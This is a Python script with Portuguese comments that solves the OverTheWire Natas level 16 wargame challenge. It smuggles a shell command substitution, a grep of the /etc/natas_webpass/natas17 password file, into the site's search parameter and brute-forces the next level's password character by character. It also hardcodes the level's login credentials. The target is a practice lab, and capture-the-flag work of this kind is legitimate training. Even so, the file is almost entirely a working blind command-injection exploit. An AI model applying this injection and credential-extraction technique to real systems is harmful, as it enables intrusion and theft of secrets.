import requests
from requests.auth import HTTPBasicAuth  # Importa a classe para autenticação básica HTTP

# Definindo as credenciais para autenticação no site
username = 'natas16'                         	# Nome de usuário para a autenticação
password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'   # Senha associada ao usuário

# Conjunto de caracteres possíveis para a senha (força bruta)
characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

# A variável 'out' irá armazenar a senha conforme vamos descobrindo cada caractere
out = ""

# Constante que pode ser explicada melhor
AFRICAN_RESPONSE = "African"

# Usando uma sessão persistente para melhorar a performance
session = requests.Session()
session.auth = (username, password)

# Loop para tentar adivinhar cada um dos 32 caracteres da senha
for i in range(0, 32):

    # Itera sobre cada caractere possível
    for j in characters:

        # Construa o comando 'grep' para verificar se a senha começa com a string parcial
        command = f"^$(grep -o ^{out + j} /etc/natas_webpass/natas17)A"

        # Parâmetros da requisição
        payload = {'needle': command, 'submit': 'search'}

        try:
            # Realiza a requisição GET para a página web com autenticação básica
            result = session.get(
                'http://natas16.natas.labs.overthewire.org/',   # URL do desafio
                params=payload                                  # Envia os parâmetros da requisição (comando de busca)
            )

            # Obtém o conteúdo da resposta HTML da página
            str1 = result.text
            # print(str1)

            # Extrai a parte da resposta que está entre as tags <pre>
            start = str1.find('<pre>\n') + len('<pre>\n')
            end = str1.find('</pre>')
            str2 = [x for x in str1[start:end].split('\n')]  # Divide o conteúdo entre as linhas

            # Verifica se a primeira linha da resposta não contém a string "African"
            if str2[0] != AFRICAN_RESPONSE:
                
                # Se a resposta for válida, adiciona o caractere encontrado à variável 'out'
                out += j
                print(f"Senha parcial: {out}")  # Imprime a senha parcial

                break  # Sai do loop interno e vai para o próximo caractere

        except requests.exceptions.RequestException as e:
            
            print(f"Erro na requisição: {e}")
            continue

# Ao final, imprime a senha completa que foi descoberta
print(f"# Senha completa: {out}")
